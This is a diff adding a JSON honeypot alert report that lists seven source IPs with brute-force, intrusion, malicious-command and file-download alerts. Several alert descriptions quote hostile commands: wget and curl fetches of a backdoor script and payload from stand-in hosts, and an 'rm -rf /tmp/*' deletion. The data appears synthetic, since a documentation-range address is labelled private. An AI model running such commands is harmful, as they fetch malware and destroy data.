@@ -1,0 +1,230 @@
+{
+  "generated_at": "2025-12-11T16:05:11.342424",
+  "total_ips": 7,
+  "private_ips": 7,
+  "public_ips": 0,
+  "attacking_ips": {
+    "192.168.1.100": {
+      "ip": "192.168.1.100",
+      "attack_count": 2,
+      "first_seen": "2025-12-11T14:58:27.330206",
+      "last_seen": "2025-12-11T15:47:12.742263",
+      "severities": [
+        "CRITICAL"
+      ],
+      "threat_types": [
+        "SUCCESSFUL_INTRUSION"
+      ],
+      "alerts": [
+        {
+          "alert_id": "ALERT-2024-12-11T14:00:00-1",
+          "timestamp": "2025-12-11T14:58:27.330206",
+          "severity": "CRITICAL",
+          "threat_type": "SUCCESSFUL_INTRUSION",
+          "description": "Successful login from 192.168.1.100 to honeypot"
+        },
+        {
+          "alert_id": "ALERT-CRITICAL-001",
+          "timestamp": "2025-12-11T15:47:12.742263",
+          "severity": "CRITICAL",
+          "threat_type": "SUCCESSFUL_INTRUSION",
+          "description": "SUCCESSFUL_INTRUSION from 192.168.1.100"
+        }
+      ],
+      "whois": {
+        "type": "private",
+        "note": "Private/local IP address - whois not available"
+      }
+    },
+    "10.0.0.50": {
+      "ip": "10.0.0.50",
+      "attack_count": 2,
+      "first_seen": "2025-12-11T14:58:27.330224",
+      "last_seen": "2025-12-11T15:47:12.742281",
+      "severities": [
+        "HIGH"
+      ],
+      "threat_types": [
+        "MALICIOUS_COMMAND"
+      ],
+      "alerts": [
+        {
+          "alert_id": "ALERT-2024-12-11T14:01:00-2",
+          "timestamp": "2025-12-11T14:58:27.330224",
+          "severity": "HIGH",
+          "threat_type": "MALICIOUS_COMMAND",
+          "description": "Malicious command detected: wget http://malicious-site.com/backdoor.sh"
+        },
+        {
+          "alert_id": "ALERT-HIGH-001",
+          "timestamp": "2025-12-11T15:47:12.742281",
+          "severity": "HIGH",
+          "threat_type": "MALICIOUS_COMMAND",
+          "description": "MALICIOUS_COMMAND from 10.0.0.50"
+        }
+      ],
+      "whois": {
+        "type": "private",
+        "note": "Private/local IP address - whois not available"
+      }
+    },
+    "127.0.0.1": {
+      "ip": "127.0.0.1",
+      "attack_count": 45,
+      "first_seen": "2025-12-11T15:14:55.295984",
+      "last_seen": "2025-12-11T15:40:00.596071",
+      "severities": [
+        "CRITICAL",
+        "HIGH",
+        "MEDIUM"
+      ],
+      "threat_types": [
+        "BRUTE_FORCE_ATTEMPT",
+        "MALICIOUS_COMMAND",
+        "SUCCESSFUL_INTRUSION",
+        "SUSPICIOUS_FILE_DOWNLOAD"
+      ],
+      "alerts": [
+        {
+          "alert_id": "ALERT-2025-12-11T15:14:55.295984-1192",
+          "timestamp": "2025-12-11T15:14:55.295984",
+          "severity": "CRITICAL",
+          "threat_type": "SUCCESSFUL_INTRUSION",
+          "description": "Successful login from 127.0.0.1 to honeypot"
+        },
+        {
+          "alert_id": "ALERT-2025-12-11T15:14:55.295996-1192",
+          "timestamp": "2025-12-11T15:14:55.295996",
+          "severity": "HIGH",
+          "threat_type": "MALICIOUS_COMMAND",
+          "description": "Malicious command detected: wget http://malicious-site.com/backdoor.sh"
+        },
+        {
+          "alert_id": "ALERT-2025-12-11T15:14:55.296001-1192",
+          "timestamp": "2025-12-11T15:14:55.296001",
+          "severity": "HIGH",
+          "threat_type": "MALICIOUS_COMMAND",
+          "description": "Malicious command detected: curl -O http://evil.com/payload.py"
+        },
+        {
+          "alert_id": "ALERT-2025-12-11T15:14:55.296004-1192",
+          "timestamp": "2025-12-11T15:14:55.296004",
+          "severity": "HIGH",
+          "threat_type": "MALICIOUS_COMMAND",
+          "description": "Malicious command detected: rm -rf /tmp/*"
+        },
+        {
+          "alert_id": "ALERT-2025-12-11T15:14:55.296007-1192",
+          "timestamp": "2025-12-11T15:14:55.296007",
+          "severity": "HIGH",
+          "threat_type": "SUSPICIOUS_FILE_DOWNLOAD",
+          "description": "Suspicious file downloaded: malware.sh"
+        }
+      ],
+      "whois": {
+        "type": "private",
+        "note": "Private/local IP address - whois not available"
+      }
+    },
+    "172.16.0.25": {
+      "ip": "172.16.0.25",
+      "attack_count": 1,
+      "first_seen": "2025-12-11T15:47:12.742288",
+      "last_seen": "2025-12-11T15:47:12.742288",
+      "severities": [
+        "HIGH"
+      ],
+      "threat_types": [
+        "SUSPICIOUS_FILE_DOWNLOAD"
+      ],
+      "alerts": [
+        {
+          "alert_id": "ALERT-HIGH-002",
+          "timestamp": "2025-12-11T15:47:12.742288",
+          "severity": "HIGH",
+          "threat_type": "SUSPICIOUS_FILE_DOWNLOAD",
+          "description": "SUSPICIOUS_FILE_DOWNLOAD from 172.16.0.25"
+        }
+      ],
+      "whois": {
+        "type": "private",
+        "note": "Private/local IP address - whois not available"
+      }
+    },
+    "203.0.113.42": {
+      "ip": "203.0.113.42",
+      "attack_count": 1,
+      "first_seen": "2025-12-11T15:47:12.742292",
+      "last_seen": "2025-12-11T15:47:12.742292",
+      "severities": [
+        "CRITICAL"
+      ],
+      "threat_types": [
+        "SUCCESSFUL_INTRUSION"
+      ],
+      "alerts": [
+        {
+          "alert_id": "ALERT-CRITICAL-002",
+          "timestamp": "2025-12-11T15:47:12.742292",
+          "severity": "CRITICAL",
+          "threat_type": "SUCCESSFUL_INTRUSION",
+          "description": "SUCCESSFUL_INTRUSION from 203.0.113.42"
+        }
+      ],
+      "whois": {
+        "type": "private",
+        "note": "Private/local IP address - whois not available"
+      }
+    },
+    "192.168.150.14": {
+      "ip": "192.168.150.14",
+      "attack_count": 1,
+      "first_seen": "2025-12-11T21:00:39.435915",
+      "last_seen": "2025-12-11T21:00:39.435915",
+      "severities": [
+        "MEDIUM"
+      ],
+      "threat_types": [
+        "BRUTE_FORCE_ATTEMPT"
+      ],
+      "alerts": [
+        {
+          "alert_id": "ALERT-2025-12-11T21:00:39.435915-839",
+          "timestamp": "2025-12-11T21:00:39.435915",
+          "severity": "MEDIUM",
+          "threat_type": "BRUTE_FORCE_ATTEMPT",
+          "description": "Brute force attempt from 192.168.150.14"
+        }
+      ],
+      "whois": {
+        "type": "private",
+        "note": "Private/local IP address - whois not available"
+      }
+    },
+    "192.168.106.52": {
+      "ip": "192.168.106.52",
+      "attack_count": 1,
+      "first_seen": "2025-12-11T21:02:31.196384",
+      "last_seen": "2025-12-11T21:02:31.196384",
+      "severities": [
+        "CRITICAL"
+      ],
+      "threat_types": [
+        "SUCCESSFUL_INTRUSION"
+      ],
+      "alerts": [
+        {
+          "alert_id": "ALERT-2025-12-11T21:02:31.196384-1872",
+          "timestamp": "2025-12-11T21:02:31.196384",
+          "severity": "CRITICAL",
+          "threat_type": "SUCCESSFUL_INTRUSION",
+          "description": "Successful login from 192.168.106.52 to honeypot"
+        }
+      ],
+      "whois": {
+        "type": "private",
+        "note": "Private/local IP address - whois not available"
+      }
+    }
+  }
+}
